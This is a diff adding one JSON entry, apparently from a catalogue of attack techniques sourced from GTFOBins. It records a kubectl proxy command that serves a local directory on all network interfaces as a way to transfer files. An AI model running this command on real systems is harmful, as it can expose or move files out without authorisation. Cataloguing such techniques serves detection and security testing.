@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-kubectl-upload",
+  "name": "GTFOBins · kubectl (upload)",
+  "command": "kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/",
+  "description": "Use kubectl to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "kubectl",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/kubectl/#upload",
+  "upstream_id": "kubectl/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/kubectl/"
+    }
+  ]
+}
